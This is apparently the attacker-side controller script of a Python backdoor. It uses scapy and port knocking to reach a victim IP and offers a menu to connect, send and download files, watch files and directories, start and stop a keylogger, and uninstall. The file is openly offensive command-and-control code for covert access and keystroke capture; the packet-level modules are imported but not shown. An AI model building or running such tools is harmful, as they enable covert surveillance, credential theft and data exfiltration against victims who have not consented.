import os
import subprocess

from enum import StrEnum

from scapy.all import *
from scapy.layers.inet import IP, TCP

from mods.protocol import send_data, receive_data, receive_packet
from mods.knocking import send_port_knocks
from mods.handlers import handle_command
from mods.shared import OPTIONS_LIST, Cfg, get_ip_address

ATTACKER_STATE = {
    'connected_to_victim': False,
    'keylogger_started': False,
}

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="")
    p.add_argument("--ip", type=str, required=True)
    p.add_argument("--iface", type=str, default='en0')

    return p

def _get_available_actions():
    if not ATTACKER_STATE['connected_to_victim']:
        return ['cn', 'ex']

    actions = ['dc', 'sf', 'dl', 'wf', 'wd', 'rn']
    if ATTACKER_STATE['keylogger_started']:
        actions.append('k-')
    else:
        actions.append('k+')
    
    actions.append('un')
    actions.append('ex')
    return actions

def _print_menu(logs: str = ''):
    while True:
        subprocess.run('cls' if os.name == 'nt' else 'clear', shell=True)
        print('Choose action:')
        valid_actions = _get_available_actions()
        for a in valid_actions:
            print(f'{a} {OPTIONS_LIST[a]}')

        print('\n========== output ==========')
        print(f'{logs}')
        print('============================')
        command = input("\n\t Command: ").strip()
        parts = command.split(' ')

        return parts[0], parts[1:]


def run_menu():
    logs = '...'

    while True:
        command, args = _print_menu(logs)

        if command == 'ex':
            print('Exiting...')
            return
        else:
            logs = handle_command(command, args, ATTACKER_STATE)

def main():
    print('hello from server')

    args = build_parser().parse_args()
    my_ip = get_ip_address(args.iface)

    print(f'setting interface to: {args.iface}')
    Cfg.IFACE = args.iface
    print(f'setting attackerip to: {my_ip}')
    Cfg.ATTACKER_IP = my_ip
    print(f'setting victimip to: {args.ip}')
    Cfg.VICTIM_IP = args.ip

    run_menu()
    # show_interfaces()


if __name__ == "__main__":
    main()